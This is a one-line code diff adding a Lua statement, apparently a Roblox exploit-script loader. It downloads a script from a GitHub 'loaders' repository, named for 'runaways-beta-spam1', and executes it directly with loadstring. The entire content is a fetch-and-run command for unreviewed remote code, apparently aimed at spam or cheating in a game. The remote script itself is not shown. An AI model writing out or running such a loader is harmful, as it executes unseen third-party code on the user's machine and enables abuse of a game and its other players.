@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Centeryeabyss/loaders/main/loaders/runaways-beta-spam1-lzxsen2hoasf2k.lua"))()
